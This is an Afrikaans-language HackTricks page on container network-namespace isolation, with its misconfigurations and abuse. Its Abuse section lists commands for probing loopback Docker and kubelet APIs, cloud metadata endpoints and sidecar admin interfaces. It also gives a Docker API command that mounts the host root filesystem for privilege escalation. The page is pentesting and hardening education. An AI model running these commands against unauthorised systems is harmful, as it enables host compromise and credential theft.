# Netwerk-namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die netwerk-namespace isoleer netwerkverwante hulpbronne soos interfaces, IP-adresse, roeteringstabelle, ARP/neighbor-toestand, firewall-reëls, sockets, die abstrakte socket-namespace van die UNIX-domein, en die inhoud van lêers soos `/proc/net`.<sup>[[2]](#references)</sup> Daarom kan 'n container iets hê wat soos sy eie `eth0`, sy eie plaaslike roetes en sy eie loopback-toestel lyk, sonder om die werklike netwerkstack van die host te besit.

Vanuit 'n sekuriteitsoogpunt is dit belangrik omdat netwerk-isolasie oor veel meer as poortbinding gaan. 'n Private netwerk-namespace beperk wat die workload direk kan waarneem of herkonfigureer. Sodra daardie namespace met die host gedeel word, kan die container skielik sigbaarheid kry in host-listeners, host-plaaslike dienste, abstrakte AF_UNIX-endpunte en netwerkbeheerpunte wat nooit bedoel was om aan die application blootgestel te word nie.

## Werking

'n Nuutgeskepte netwerk-namespace begin met 'n leë of byna leë netwerkomgewing totdat interfaces daaraan gekoppel word. Container runtimes skep of koppel dan virtuele interfaces, ken adresse toe en stel roetes op sodat die workload die verwagte konnektiwiteit het. In bridge-gebaseerde ontplooiings beteken dit gewoonlik dat die container 'n veth-gesteunde interface sien wat aan 'n host-bridge gekoppel is. In Kubernetes hanteer CNI plugins die ekwivalente opstelling vir Pod-netwerke.

Hierdie argitektuur verduidelik waarom `--network=host` of `hostNetwork: true` so 'n dramatiese verandering is. In plaas daarvan om 'n voorbereide private netwerkstack te ontvang, sluit die workload by die werklike netwerkstack van die host aan.

## Laboratorium

Jy kan 'n byna leë netwerk-namespace sien met:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
En jy kan normale en host-networked-houers vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Die host-networked container het nie meer sy eie geïsoleerde socket- en interface-aansig nie. Daardie verandering alleen is reeds betekenisvol voordat jy selfs vra watter capabilities die proses het.

## Runtime Usage

Docker en Podman skep normaalweg ’n private network namespace vir elke container, tensy dit anders gekonfigureer is. Kubernetes gee gewoonlik aan elke Pod sy eie network namespace, wat deur die containers binne daardie Pod gedeel word, maar van die host geskei is. Dit beteken dat `127.0.0.1` gewoonlik Pod-lokaal eerder as container-lokaal is: ’n listener wat slegs aan localhost gebind is in een container, is tipies vanaf sy sidecars en siblings bereikbaar. Incus/LXC-stelsels bied ook uitgebreide network-namespace-gebaseerde isolasie, dikwels met ’n groter verskeidenheid virtual networking-opstellings.

Die algemene beginsel is dat private networking die verstek-isolasiegrens is, terwyl host networking ’n eksplisiete opt-out van daardie grens is.

## Misconfigurations

Die belangrikste misconfiguration is eenvoudigweg om die host network namespace te deel. Dit word soms vir performance, low-level monitoring of gerief gedoen, maar dit verwyder een van die duidelikste grense wat vir containers beskikbaar is. Host-local listeners word op ’n meer direkte manier bereikbaar, localhost-only services kan toeganklik word, en capabilities soos `CAP_NET_ADMIN` of `CAP_NET_RAW` word baie gevaarliker omdat die bewerkings wat hulle moontlik maak, nou op die host se eie network environment toegepas word.

Nog ’n probleem is die oormatige toekenning van network-related capabilities, selfs wanneer die network namespace private is. ’n Private namespace help wel, maar dit maak raw sockets of gevorderde network control nie onskadelik nie.

In Kubernetes verander `hostNetwork: true` ook hoeveel vertroue jy in Pod-level network segmentation kan plaas. Kubernetes dokumenteer dat baie network plugins nie verkeer vanaf `hostNetwork` Pods behoorlik vir `podSelector` / `namespaceSelector`-matching kan onderskei nie en dit daarom as gewone node-verkeer behandel.<sup>[[1]](#references)</sup> Vanuit ’n aanvaller se oogpunt beteken dit dat ’n gekompromitteerde `hostNetwork` workload dikwels as ’n node-level network foothold behandel moet word, eerder as ’n normale Pod wat steeds deur dieselfde policy-aannames as overlay-network workloads beperk word.

## Abuse

In swak geïsoleerde opstellings kan aanvallers host listening services inspekteer, management endpoints bereik wat slegs aan loopback gebind is, verkeer sniff of daarmee inmeng, afhangend van die presiese capabilities en environment, of routing- en firewall-state herkonfigureer indien `CAP_NET_ADMIN` teenwoordig is. In ’n cluster kan dit lateral movement en control-plane reconnaissance ook makliker maak.

As jy host networking vermoed, begin deur te bevestig dat die sigbare interfaces en listeners aan die host behoort eerder as aan ’n geïsoleerde container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only-dienste is dikwels die eerste interessante ontdekking:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets is nog ’n maklik-om-te-mis-teiken, omdat hulle binne network namespaces afgebaken is, al lyk hulle nie soos TCP/UDP listeners nie en bestaan hulle moontlik nie as lêerstelselpaths onder `/run` nie. ’n Container met host-networking kan dus toegang erf tot host-only control channels wat glad nie in die container ingebind is nie:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
'n Historiese voorbeeld was die `containerd-shim`-blootstellingsbug vir abstract-socket, maar die breër les is belangriker as die spesifieke CVE: sodra 'n werklading by die host network namespace aansluit, word abstract AF_UNIX-dienste ook deel van die attack surface.<sup>[[3]](#references)</sup> Indien daardie sockets runtime-verwant of administratief lyk, pivot na [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Indien network capabilities teenwoordig is, toets of die werklading die sigbare stack kan inspekteer of wysig:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Op moderne kernels kan host-netwerking plus `CAP_NET_ADMIN` ook die pakketroete blootstel verder as eenvoudige `iptables` / `nftables`-veranderinge. `tc` qdiscs en filters is ook namespace-beperk, dus pas hulle in ’n gedeelde host-network namespace toe op die host-koppelvlakke wat die container kan sien. As `CAP_BPF` ook teenwoordig is, word netwerkverwante eBPF-programme soos TC- en XDP-loaders eweneens relevant:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Dit is belangrik omdat ’n aanvaller verkeer op die host-koppelvlakvlak kan mirror, redirect, shape of drop, en nie net firewall-reëls kan herskryf nie. In ’n private network namespace bly daardie aksies beperk tot die container se aansig; in ’n gedeelde host namespace raak dit die host.

In cluster- of cloud-omgewings regverdig host networking ook vinnige plaaslike recon van metadata en control-plane-adjacent dienste:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
In Kubernetes, onthou dat die kompromittering van **enige** container in ’n multi-container Pod ook toegang gee tot localhost-listeners wat deur sibling containers en sidecars oopgemaak is, omdat die hele Pod een network namespace deel. Dit word veral relevant met service-mesh-, observability- en helper-containers waarvan die admin- of debug-interfaces doelbewus Pod-internal eerder as cluster-wyd is:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Behandel "bound to localhost" as **Pod-private**, nie **container-private** nie. Nadat een container in die Pod gekompromitteer is, is daardie aanname nie meer geldig nie.

### Volledige voorbeeld: Host Networking + Local Runtime / Kubelet Access

Host networking verskaf nie outomaties host root nie, maar dit stel dikwels dienste bloot wat doelbewus slegs vanaf die node self bereikbaar is. Indien een van daardie dienste swak beskerm word, word host networking ’n direkte privilege-escalation-pad.

Docker API op localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet op localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impak:

- direkte kompromittering van die host indien ’n plaaslike runtime API sonder behoorlike beskerming blootgestel word
- cluster-verkenning of laterale beweging indien kubelet of plaaslike agents bereikbaar is
- verkeersmanipulasie of denial of service wanneer dit met `CAP_NET_ADMIN` gekombineer word

## Kontroles

Die doel van hierdie kontroles is om vas te stel of die proses ’n private netwerkstack het, watter roetes en listeners sigbaar is, en of die netwerkaansig reeds soos dié van ’n host lyk voordat jy selfs capabilities toets.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Wat is hier interessant:

- As `/proc/self/ns/net` en `/proc/1/ns/net` reeds host-agtig lyk, deel die container moontlik die host se network namespace of ’n ander nie-private namespace.
- `lsns -t net` en `ip netns identify` is nuttig wanneer die shell reeds binne ’n benoemde of persistente namespace is en jy dit met `/run/netns`-objekte vanaf die host-kant wil korreleer.
- `ss -lntup` is besonder waardevol omdat dit loopback-slegs-listeners en plaaslike management endpoints onthul. `ss -xap` en `/proc/net/unix` voeg die abstract-socket-aansig by wat gewone filesystem-socket-soektogte mis.
- Roetes, interface-name, firewall-konteks, `tc`-toestand en eBPF-aanhegtings word baie belangriker indien `CAP_NET_ADMIN`, `CAP_NET_RAW` of `CAP_BPF` teenwoordig is.
- In Kubernetes kan mislukte service-name resolution vanaf ’n `hostNetwork` Pod eenvoudig beteken dat die Pod nie `dnsPolicy: ClusterFirstWithHostNet` gebruik nie, en nie dat die service afwesig is nie.
- In multi-container Pods behoort localhost-listeners aan die hele Pod-network namespace, dus moet jy sidecars en sibling containers nagaan voordat jy aanvaar dat ’n loopback-slegs-poort onbereikbaar vanaf die gekompromitteerde container is.

Wanneer jy ’n container hersien, evalueer altyd die network namespace saam met die capability set. Host networking plus sterk network capabilities is ’n heeltemal ander sekuriteitsposisie as bridge networking plus ’n beperkte verstek-capability set.

## Verwysings

- [1] [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` and abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
